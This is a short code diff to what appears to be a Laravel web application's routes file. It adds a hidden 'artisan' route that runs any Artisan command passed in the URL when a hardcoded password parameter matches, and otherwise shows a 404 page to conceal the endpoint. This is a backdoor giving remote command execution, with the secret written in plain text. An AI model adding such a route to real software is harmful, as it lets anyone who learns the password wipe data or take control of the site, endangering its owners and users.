@@ -100,4 +100,11 @@ Route::get('/',function(){
     return view('landing.home');
 });
 
+Route::get('artisan',function(Request $request){
+   if($request->pass == "hamidxmir")
+       Artisan::call($request->command);
+   else
+      abort(404);
+});
+
 
